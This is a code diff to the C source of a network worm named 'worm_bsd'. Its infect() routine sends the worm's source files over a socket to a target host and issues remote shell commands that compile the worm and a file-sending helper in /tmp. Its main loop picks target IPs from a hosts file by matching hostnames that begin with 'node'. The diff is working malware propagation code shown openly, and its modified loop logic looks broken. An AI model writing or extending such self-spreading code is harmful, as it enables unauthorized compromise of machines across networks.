@@ -106,7 +106,7 @@ void infect(ip)
     printf("[*] Forking to create send_file process\n");
 
     if (fork() == 0) {
-        argv[0] = "send_file_over_socket_bsd";
+        argv[0] = "send_file_over_socket_bsd.c";
         argv[1] = "worm_bsd.c";
         argv[2] = "worm_bsd.h";
         argv[3] = (char *)0;
@@ -127,9 +127,12 @@ void infect(ip)
     printf("[*] DEBUG: Checking /tmp contents on target...\n");
     write_to_sock(sock, "ls -l /tmp/worm_bsd*\n");
     sleep(2);
-    bzero(io_buf, IO_BUF_SIZE);
     read_from_sock(sock, io_buf, IO_BUF_SIZE);
-    printf("--- TARGET /TMP CONTENTS ---\n%s\n----------------------------\n", io_buf);
+
+    printf("[*] Compile send_file_over_socket_bsd.c on target\n");
+    write_to_sock(sock, "cd /tmp; cc send_file_over_socket_bsd.c -o send_file_over_socket_bsd\n");
+    sleep(2);
+    read_from_sock(sock, io_buf, IO_BUF_SIZE);
 
     printf("[*] Compiling worm_bsd.c on target\n");
     write_to_sock(sock, "cd /tmp; rm -f worm_bsd; cc worm_bsd.c -o worm_bsd\n");
@@ -169,23 +172,32 @@ int main()
         }
 
         while (fgets(line, 128, fp) != (char *)0) {
-            if (line[0] == '#' || line[0] == '\n' || line[0] == ' ' || (line[0]!= '1' && line[1] != '2' && line[2] != '7'))
-                continue;
+            char current_hostname[64];
 
-            if (sscanf(line, "%s", ip) != 1)
+            if (line[0] == '#' || line[0] == '\n' || line[0] == ' ' || line[0] == '\t') {
                 continue;
+            }
 
-            if (strcmp(ip, "127.0.0.1") == 0)
+            if (sscanf(line, "%s %s", ip, current_hostname) != 2) {
                 continue;
+            }
 
             if (strcmp(ip, my_ip) == 0) {
                 continue;
             }
 
-            infect(ip);
-            printf(" ---- Infection Cycle completed for IP: %s ----\n", ip);
-            sleep(10);
+            /* Check if the first 4 characters of the hostname are "node" */
+            if (strncmp(current_hostname, "node", 4) == 0) {
+                
+                /* SUCCESS: 'ip' now holds the address of a node. */
+                 printf("IP for %s found: %s\n", current_hostname, ip);
+            }
         }
+
+        infect(ip);
+        printf(" ---- Infection Cycle completed for IP: %s ----\n", ip);
+        sleep(10);
+        
         fclose(fp);
     }
 }
